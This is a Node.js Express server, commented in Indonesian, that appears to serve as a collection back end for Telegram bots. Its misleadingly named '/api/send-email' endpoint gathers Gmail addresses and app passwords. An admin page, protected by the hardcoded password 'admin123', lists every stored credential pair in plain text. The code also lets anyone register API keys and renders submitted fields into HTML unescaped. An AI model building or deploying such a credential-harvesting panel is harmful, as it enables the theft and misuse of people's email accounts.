const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Database RAM (Data tersimpan selama server tidak 'sleep')
let storage = {
    api_keys: ["beckk001"], // API Key Default sesuai SC bot kamu
    logs: []
};

// --- [ 1. DASHBOARD STATUS ] ---
app.get('/', (req, res) => {
    res.send(`
        <body style="font-family:sans-serif; background:#0f172a; color:white; text-align:center; padding:50px;">
            <h1>Master Base API Active</h1>
            <p>Total Data Masuk: ${storage.logs.length}</p>
            <p>Admin Panel: <code>/api/view-all?pw=admin123</code></p>
        </body>
    `);
});

// --- [ 2. CREATE API KEY ] ---
// URL: /api/create-api?name=Rullz
app.get('/api/create-api', (req, res) => {
    const { name } = req.query;
    if (!name) return res.json({ status: false, msg: "Nama key wajib diisi!" });

    if (!storage.api_keys.includes(name)) {
        storage.api_keys.push(name);
    }

    res.json({
        status: true,
        msg: "API Key Berhasil Dibuat",
        apikey: name,
        endpoint: `https://${req.get('host')}/api/send-email`
    });
});

// --- [ 3. ENDPOINT PENAMPUNG (POST) ] ---
// Ini yang ditempel di API_URL bot kamu
app.post('/api/send-email', (req, res) => {
    const { apikey, email, password, app_name } = req.body;

    // Validasi API Key
    if (!storage.api_keys.includes(apikey)) {
        return res.status(403).json({ status: false, msg: "API Key Salah/Tidak Terdaftar!" });
    }

    const newLog = {
        id: Date.now(),
        sender: apikey,
        app: app_name || "Bot Telegram",
        gmail: email,
        app_pw: password,
        date: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
    };

    storage.logs.unshift(newLog); // Masukkan data terbaru di posisi paling atas
    res.json({ status: true, msg: "Data berhasil di-upload ke Base!" });
});

// --- [ 4. VIEW ALL DATA (ADMIN PANEL) ] ---
// URL: /api/view-all?pw=admin123
app.get('/api/view-all', (req, res) => {
    const { pw } = req.query;
    if (pw !== 'admin123') return res.status(401).send("Password Salah!");

    let rows = storage.logs.map(log => `
        <tr style="border-bottom: 1px solid #334155;">
            <td style="padding:12px;">${log.date}</td>
            <td style="padding:12px; color:#38bdf8;">${log.sender}</td>
            <td style="padding:12px;">${log.app}</td>
            <td style="padding:12px; color:#4ade80;">${log.gmail}</td>
            <td style="padding:12px; color:#f87171;">${log.app_pw}</td>
        </tr>
    `).join('');

    res.send(`
        <body style="background:#0f172a; color:#e2e8f0; font-family:sans-serif; padding:20px;">
            <h2>Master Dashboard - Data Penampung</h2>
            <table border="1" style="width:100%; border-collapse:collapse; background:#1e293b; border:none;">
                <tr style="background:#334155; text-align:left;">
                    <th style="padding:12px;">Waktu</th>
                    <th style="padding:12px;">Sender Key</th>
                    <th style="padding:12px;">Nama App</th>
                    <th style="padding:12px;">Gmail User</th>
                    <th style="padding:12px;">App Password</th>
                </tr>
                ${rows || '<tr><td colspan="5" style="text-align:center; padding:20px;">Belum ada data masuk</td></tr>'}
            </table>
        </body>
    `);
});

module.exports = app;